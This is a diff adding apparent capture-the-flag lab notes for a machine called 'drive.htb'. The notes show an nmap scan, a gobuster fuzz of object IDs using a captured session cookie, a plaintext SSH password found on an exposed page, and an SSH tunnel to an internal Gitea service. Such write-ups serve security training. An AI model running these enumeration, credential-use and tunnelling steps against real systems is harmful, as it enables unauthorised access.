@@ -1,0 +1,58 @@
+> nmap 10.10.11.235 -p-
+
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 13:29 CET
+Nmap scan report for 10.10.11.235
+Host is up (0.090s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+3000/tcp filtered ppp
+
+Nmap done: 1 IP address (1 host up) scanned in 44.58 seconds
+
+> gobuster fuzz -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: fr-FR,fr;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6' -H 'Cache-Control: max-age=0' -H 'Connection: keep-alive' -H 'Cookie: csrftoken=HFqEBBBwKbzPcEed52296mjgg91ZEHd1; sessionid=1izgscr08y4i2rnjlzu0ehjad3hvga5x' -H 'Host: drive.htb' -H 'Referer: http://drive.htb/home/' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36' -u drive.htb/FUZZ/block/ -w ids.txt -b 404
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://drive.htb/FUZZ/block/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                ids.txt
+[+] Excluded Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in fuzzing mode
+===============================================================
+
+Found: [Status=200] [Length=1923] [Word=79] http://drive.htb/79/block/
+Found: [Status=200] [Length=1717] [Word=98] http://drive.htb/98/block/
+Found: [Status=200] [Length=1736] [Word=99] http://drive.htb/99/block/
+Found: [Status=200] [Length=1746] [Word=100] http://drive.htb/100/block/
+Found: [Status=200] [Length=1928] [Word=101] http://drive.htb/101/block/
+Found: [Status=200] [Length=1867] [Word=112] http://drive.htb/112/block/
+
+Progress: 1000 / 1001 (99.90%)
+===============================================================
+Finished
+===============================================================
+
+> in id 79 :
+	USER: martin, PASS: Xk4@KjyrYv8t194L!
+
+> connection through ssh
+> port 3000 is reachable from localhost (web server on dev)
+
+> ssh -L 3000:localhost:3000 martin@drive.htb
+> open website at localhost:3000
+> gitea
+
+> martin@drive:~$ find / -name gitea 2>/dev/null
+	/etc/gitea
+	/var/lib/gitea
+	> /usr/local/bin/gitea <
+
+
